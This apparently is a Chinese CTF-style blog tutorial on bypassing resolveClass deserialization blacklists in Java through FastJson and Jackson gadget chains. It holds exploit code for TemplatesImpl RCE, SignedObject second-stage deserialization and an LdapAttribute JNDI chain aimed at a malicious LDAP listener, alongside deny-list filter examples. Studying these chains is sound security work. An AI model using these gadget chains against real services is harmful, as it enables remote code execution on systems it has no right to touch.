---
title: Java 反序列化绕过 resolvClass
date: 2023-07-23 20:31:48
categories:
- Java
tags:
- Deserialization
toc: true
mermaid: true
image:
  path: /assets/images/java.png
notshow: true
---


## resolveClass 简介
resolveClass 是一个用于在对象反序列化过程中进行类解析的方法,该方法属于 ObjectInputStream 类的内部类 ObjectStreamClass,在一些反序列化场景下,resolveClass 被用于实现黑名单过滤,示例如下:
1. 编写一个 MyObjectInputStream 类继承自 ObjectInputStream 并重写 resolveClass 方法。
    ```java
    public class MyObjectInputStream extends ObjectInputStream {
        public MyObjectInputStream(InputStream in) throws IOException {
            super(in);
        }

        protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
            String className = desc.getName();
            String[] denyClasses = new String[]{"java.net.InetAddress", "org.apache.commons.collections.Transformer", "org.apache.commons.collections.functors", "com.yancao.ctf.bean.URLVisiter", "com.yancao.ctf.bean.URLHelper"};
            String[] var4 = denyClasses;
            int var5 = denyClasses.length;

            for(int var6 = 0; var6 < var5; ++var6) {
                String denyClass = var4[var6];
                if (className.startsWith(denyClass)) {
                    throw new InvalidClassException("Unauthorized deserialization attempt", className);
                }
            }

            return super.resolveClass(desc);
        }
    }
    ```
2. 在反序列化时使用 MyObjectInputStream 来读取序列化内容。
    ```java
            ObjectInputStream ois = new MyObjectInputStream(byteArrayInputStream);
            URLHelper o = (URLHelper)ois.readObject();
    ```

## 结合 FastJson 绕过 resolveClass
### FastJson 中的原生反序列化 gadget
在 fastjson <= 1.2.48 版本中，存在这样的一个 gadget：通过触发 JSONArray 和 JSONObject 这两个类的 toString 方法来调用任意的 getter 方法，由于该版本下，JSONArray 和 JSONObject 并没有 readObject 方法，因此需要通过 BadAttributeValueExpException 来触发 toString，具体的利用链如下：

BadAttributeValueExpException ->  JSONArray/JSONObject.toString -> toJSONString -> TemplateImpl.getOutputProperties

这个 gadget 可以在原生反序列化中使用，具体细节可见：[FastJson与原生反序列化 - Y4tacker's Blog](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%AF%BB%E6%89%BE)

### 绕过 resolveClass
到了 fastjson > 1.2.48 版本，JSONArray 和 JSONObject 有了自己的 readObject 方法，并且使用 SecureObjectInputStream 来读取序列化内容。SecureObjectInputStream 使用了 resolveClass 来进行过滤，其中调用了 checkAutoType 来检查是否为危险类。fastjson 维护了一个黑名单，部分内容可见：[LeadroyaL/fastjson-blacklist](https://github.com/LeadroyaL/fastjson-blacklist)
```java
        protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
            String name = desc.getName();
            if (name.length() > 2) {
                int index = name.lastIndexOf(91);
                if (index != -1) {
                    name = name.substring(index + 1);
                }

                if (name.length() > 2 && name.charAt(0) == 'L' && name.charAt(name.length() - 1) == ';') {
                    name = name.substring(1, name.length() - 1);
                }

                if (TypeUtils.getClassFromMapping(name) == null) {
                    ParserConfig.global.checkAutoType(name, (Class)null, Feature.SupportAutoType.mask);
                }
            }绕过

            return super.resolveClass(desc);
        }
```

#### 使用 Reference 类型绕过
但在原生反序列化的调用过程中，某些类型不会调用 resolveClass 方法，[影响fastjson全版本的反序列化过程中的任意getter方法触发RCE - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/365636.html)，这些类型如下：
1. NULL
2. REFERENCE 引用类型
3. STRING
4. LONGSTRING
5. EXCEPTION

因此只要将恶意序列化数据设置为上述的类型，就可以绕过 resolveClass 函数，这几种类型中，满足利用的只有 Reference 引用类型。

当我们向 List、Set、Map 类型中多次添加同样的对象，就可以构造出引用类型，例如：
```java
ArrayList<Object> arrayList = new ArrayList<>();
arrayList.add(templates);
arrayList.add(templates);
```

EXP 如下：
```java
    public static Object toString2RCE_BypassWithReference(String cmd) throws Exception {
        TemplatesImpl templates = GTemplates.getEvilTemplates(cmd);

        JSONObject jsonObject = toString2Getter(templates);

        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonObject);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);

        return hashMap;
    }
```

最后再引用大佬文章中的总结，理解这一过程是理解绕过的关键：

> 反序列化时 ArrayList 先通过 readObject 恢复 TemplatesImpl 对象，之后恢复 BadAttributeValueExpException 对象，在恢复过程中，由于 BadAttributeValueExpException 要恢复 val 对应的 JSONArray/JSONObject 对象，会触发 JSONArray/JSONObject 的 readObject 方法，将这个过程委托给 SecureObjectInputStream，**在恢复 JSONArray/JSONObject 中的 TemplatesImpl 对象时，由于此时的第二个 TemplatesImpl 对象是引用类型**，通过 readHandle 恢复对象的途中不会触发 resolveClass，由此实现了绕过。

绕过的关键在于 FastJson 仅仅在 JSONObject/JSONArray 的 readObject 中进行了限制，因此只要在进入 JSONObject/JSONArray 的 readObject 方法之前将 TemplatesImpl 反序列化出来，反序列化第二个 TemplatesImpl 对象时，就会被当作引用对象从而绕过 resolveClass。正确的写法应该是继承 ObjectInputStream 并重写 resolveClass，由这个类来做反序列化的入口，例如如下的 MyInputStream 类。

```java
    public static class MyInputStream extends ObjectInputStream {
        private final List<Object> BLACKLIST = Arrays.asList("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter", "com.sun.syndication.feed.impl.ObjectBean", "import com.sun.syndication.feed.impl.ToStringBean");

        public MyInputStream(InputStream inputStream) throws IOException {
            super(inputStream);
        }

        protected Class<?> resolveClass(ObjectStreamClass cls) throws ClassNotFoundException, IOException {
            if (this.BLACKLIST.contains(cls.getName())) {
                throw new InvalidClassException("The class " + cls.getName() + " is on the blacklist");
            } else {
                return super.resolveClass(cls);
            }
        }
    }
```
使用这个类作为反序列化的入口类，就相当于给所有的类（不仅仅是 JSONArray/JSONObject）加上了黑名单，第一个 TemplatesImpl 在反序列化时就会触发 resolveClass。

#### 二次反序列化绕过
当题目使用安全的写法（继承 ObjectInputStream 并重写resolveClass，由这个类来做反序列化的入口），就只能考虑二次反序列化绕过黑名单了。EXP 的步骤如下：
1. 构造 JSONObject 引用绕过 SecureObjectInputStream 的 resolveClass 方法。
2. 使用 SignedObject 套一层绕过入口类 MyInputStream 的 resolveClass 方法。

```java
    /*
    bypass fastjson resolveClass with Reference
    bypass self defined resolveClass with SignedObject
    fastjson 2
    Notes: change fastjson to version 2
     */
    public static Object toString2RCE_BypassWithSignedObject(String cmd) throws Exception {
        TemplatesImpl templates = GTemplates.getEvilTemplates(cmd);
        JSONObject jsonObject = toString2Getter(templates);

        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonObject);
        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);

        SignedObject signedObject = GSignedObject.getter2Deserialize(hashMap);
        JSONObject jsonObject1 = toString2Getter(signedObject);
        BadAttributeValueExpException bd1 = GBadAttributeValueExpException.deserialize2ToString(jsonObject1);

        return bd1;
    }
```
注意：FastJson 1 要求反序列化的类需要具备无参构造函数，由于 SignedObject 不存在无参构造函数，利用时会报如下的错误：
```bash
Exception in thread "main" com.alibaba.fastjson.JSONException: default constructor not found. class java.security.SignedObject
	at com.alibaba.fastjson.util.JavaBeanInfo.build(JavaBeanInfo.java:574)
	at com.alibaba.fastjson.util.JavaBeanInfo.build(JavaBeanInfo.java:218)
	at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:1531)
	at com.alibaba.fastjson.JSONObject$SecureObjectInputStream.resolveClass(JSONObject.java:597)
```
FastJson 2 版本下可以正常反序列化。

翻阅资料时发现了解决这个报错的办法，可参考文章：[Fastjson 结合 jdk 原生反序列化的利用手法 ( Aliyun CTF ) - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/369855.html)

当多次进行反序列化时，FastJson 会将上一次没有成功的类缓存起来，之后的反序列化就不会再次产生上面的错误，所以只需要多打一次即可。

```java
    public static void main(String[] args) throws Exception {
        Object o = toString2RCE_BypassWithSignedObject("mate-calc");

        try {
            testBlackList(o);
        } catch (Exception e){
            ;
        }

        try {
            testBlackList(o);
        } catch (Exception e){
            ;
        }
    }
```
## 结合 JaskSon 绕过 resolveClass
### Jackson 中的原生反序列化 gadget
与 FastJson 中的 JSONArray/JSONObject 反序列化可以调用任意 getter 方法类似，Jackson 中可以**利用 POJONode 来调用任意 getter 方法**。具体利用链如下：

BadAttributeValueExpException ->  POJONode.toString -> getter(TemplateImpl.getOutputProperties)

EXP 非常简单：
```java
    public static POJONode toString2RCE(String cmd) throws Exception {
        TemplatesImpl evilTemplates = GTemplates.getEvilTemplates(cmd);
        POJONode jsonNodes = new POJONode(evilTemplates);
        return jsonNodes;
    }

    public static void main(String[] args) throws Exception {
        POJONode jsonNodes = toString2RCE("mate-calc");
        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonNodes);
        SerializeUtils.serialize(bd, "/tmp/ser.bin");
        SerializeUtils.deserialize("/tmp/ser.bin");
    }
```

但这个类在序列化时会产生如下报错，导致反序列化时无法正常执行 payload，报错的原因在于，ObjectOuptputStream.writeObject0 方法会判断被序列化的类是否实现了 writeReplace 方法，如果实现了该方法，则会调用这个方法，POJONode 的父类 BaseJsonNode 恰好实现了 writeReplace 方法，这个报错就是在调用 BaseJsonNode.writeReplace 方法时产生。
```bash
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Exception in thread "main" java.lang.IllegalArgumentException: Failed to JDK serialize `POJONode` value: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl["outputProperties"])
	at com.fasterxml.jackson.databind.node.NodeSerialization.from(NodeSerialization.java:40)
	at com.fasterxml.jackson.databind.node.BaseJsonNode.writeReplace(BaseJsonNode.java:28)
```

解决办法是重写一个 BaseJsonNode，并将 writeReplace 方法注释掉。
```java
public abstract class BaseJsonNode
        extends JsonNode
        implements java.io.Serializable
{
    private static final long serialVersionUID = 1L;

    // Simplest way is by using a helper
//    Object writeReplace() {
//        return NodeSerialization.from(this);
//    }

    ...
```
CTF 例题可见 AliyunCTF 2023 Bypassit I

### 绕过 resolveClass
Jackson 没有像 FastJson 那样实现了一个自定义的 SecureObjectInputStream 去进行过滤，通常题目中会编写一个 resolveClass 的继承类，在反序列化入口进行过滤，绕过的方式首先考虑二次反序列化。

#### 二次反序列化绕过
使用 SignedObject 套一层，利用链如下：

BadAttributeValueExpException ->  POJONode.toString -> **SignedObject -> BadAttributeValueExpException -> POJONode.toString** -> getter(TemplateImpl.getOutputProperties)

EXP 如下：
```java
    public static POJONode toString2RCEWithSignedObject(String cmd) throws Exception {
        TemplatesImpl evilTemplates = GTemplates.getEvilTemplates(cmd);
        POJONode jsonNodes1 = new POJONode(evilTemplates);
        BadAttributeValueExpException e = GBadAttributeValueExpException.deserialize2ToString(jsonNodes1);
        SignedObject signedObject = GSignedObject.getter2Deserialize(e);

        POJONode jsonNodes2 = new POJONode(signedObject);
        return jsonNodes2;
    }

    public static void main(String[] args) throws Exception {
        POJONode jsonNodes = toString2RCEWithSignedObject("mate-calc");
        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonNodes);
        SerializeUtils.serialize(bd, "/tmp/ser.bin");
        SerializeUtils.deserialize("/tmp/ser.bin");
    }
```

#### LdapAttribute 利用链
LdapAttribute 这条利用链在 2021 年 realworldctf 中由 voidfyoo 给出，com.sun.jndi.ldap.LdapAttribute 这个类的 getAttributeDefinition 方法存在 JNDI LDAP 注入

```java
    public DirContext getAttributeDefinition() throws NamingException {
        DirContext var1 = this.getBaseCtx().getSchema(this.rdn);
        return (DirContext)var1.lookup("AttributeDefinition/" + this.getID());
    }
```

结合 POJONode 可以触发任意 getter 方法，利用链如下：

BadAttributeValueExpException ->  POJONode.toString -> LdapAttribute#getAttributeDefinition

EXP 如下，为了直观并没有将部分功能函数给出，其中 ldap://127.0.0.1:1389/ 是本地监听的恶意 LDAP 服务。
```java
public class GLdapAttribute {
    public static Object getter2RCE(String ldapServerURL) throws Exception {
        String ldapCtxUrl = ldapServerURL;
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});

        ReflectUtils.setFieldValue(ldapAttribute,"baseCtxURL", ldapCtxUrl);
        ReflectUtils.setFieldValue(ldapAttribute,"rdn", new CompositeName("a//b"));

        return ldapAttribute;
    }

    public static void main(String[] args) throws Exception {
        Object o = getter2RCE("ldap://127.0.0.1:1389/");
        POJONode jsonNodes = GJackson.toString2Getter(o);
        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonNodes);
        byte[] serialize = SerializeUtils.serialize(bd);
        SerializeUtils.deserialize(serialize);
    }
}
```


## 参考
- [Jackson反序列化通杀Web题(过时) - Boogiepop Doesn't Laugh](https://boogipop.com/2023/05/16/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/)
- [从bypassit1了解POJONode#toString调用getter方法原理 - 先知社区](https://xz.aliyun.com/t/12509)
- [FastJson结合二次反序列化绕过黑名单 - 先知社区](https://xz.aliyun.com/t/12606)
- [FastJson与原生反序列化 - Y4tacker's Blog](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E5%AF%BB%E6%89%BE)
- [影响fastjson全版本的反序列化过程中的任意getter方法触发RCE - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/365636.html)
- [Fastjson 结合 jdk 原生反序列化的利用手法 ( Aliyun CTF ) - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/369855.html)
- [realworldctf old system复盘（jdk1.4 getter jndi gadget） - 先知社区](https://xz.aliyun.com/t/9126#toc-4)